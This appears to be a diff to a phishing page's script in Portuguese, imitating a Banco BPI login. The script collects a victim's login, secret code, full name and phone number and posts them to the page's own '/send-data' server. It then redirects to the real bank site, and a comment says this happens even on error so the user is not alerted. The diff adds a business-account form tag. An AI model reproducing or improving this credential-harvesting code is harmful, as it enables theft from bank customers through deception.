@@ -203,58 +203,59 @@
       <button class="btn" onclick="submitInfo()">Confirmar</button>
     </div>
   </div>
-  <script>
-    function showModal() {
-      const login = document.getElementById('login').value.trim();
-      const password = document.getElementById('password').value.trim();
-      if (login === '' || password === '') {
-        alert('Por favor, preencha o login e o código secreto.');
-        return;
-      }
-      console.log('Mostrando modal com login:', login); // Debug: Log login value
-      document.getElementById('infoModal').style.display = 'flex';
+<script>
+  function showModal() {
+    const login = document.getElementById('login').value.trim();
+    const password = document.getElementById('password').value.trim();
+    if (login === '' || password === '') {
+      alert('Por favor, preencha o login e o código secreto.');
+      return;
     }
-
-    function closeModal() {
-      console.log('Fechando modal'); // Debug: Log modal close
-      document.getElementById('infoModal').style.display = 'none';
-    }
-
-    function submitInfo() {
-  const name = document.getElementById('fullname').value.trim();
-  const phone = document.getElementById('phone').value.trim();
-  const login = document.getElementById('login').value.trim();
-  const password = document.getElementById('password').value.trim();
-  
-  if (name === '' || phone === '' || login === '' || password === '') {
-    alert('Por favor, preencha todos os campos.');
-    return;
+    console.log('Mostrando modal com login:', login); // Debug: Log login value
+    document.getElementById('infoModal').style.display = 'flex';
   }
 
-  // Envia para o servidor Node.js
-  fetch('/send-data', {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({
-      fullname: name,
-      phone: phone,
-      login: login,
-      password: password
-    }),
-  })
-  .then(response => response.json())
-  .then(data => {
-    console.log('Sucesso:', data);
-    window.location.href = 'https://www.bancobpi.pt/particulares';
-  })
-  .catch(error => {
-    console.error('Erro:', error);
-    // Redireciona mesmo se houver erro para não alertar o usuário
-    window.location.href = 'https://www.bancobpi.pt/particulares';
-  });
-}
-  </script>
+  function closeModal() {
+    console.log('Fechando modal'); // Debug: Log modal close
+    document.getElementById('infoModal').style.display = 'none';
+  }
+
+  function submitInfo() {
+    const name = document.getElementById('fullname').value.trim();
+    const phone = document.getElementById('phone').value.trim();
+    const login = document.getElementById('login').value.trim();
+    const password = document.getElementById('password').value.trim();
+
+    if (name === '' || phone === '' || login === '' || password === '') {
+      alert('Por favor, preencha todos os campos.');
+      return;
+    }
+
+    // Envia para o servidor Node.js
+    fetch('/send-data', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        fullname: name,
+        phone: phone,
+        login: login,
+        password: password,
+        formType: 'empresa' // Adiciona o campo formType
+      }),
+    })
+      .then(response => response.json())
+      .then(data => {
+        console.log('Sucesso:', data);
+        window.location.href = 'https://www.bancobpi.pt/particulares';
+      })
+      .catch(error => {
+        console.error('Erro:', error);
+        // Redireciona mesmo se houver erro para não alertar o usuário
+        window.location.href = 'https://www.bancobpi.pt/particulares';
+      });
+  }
+</script>
 </body>
 </html>
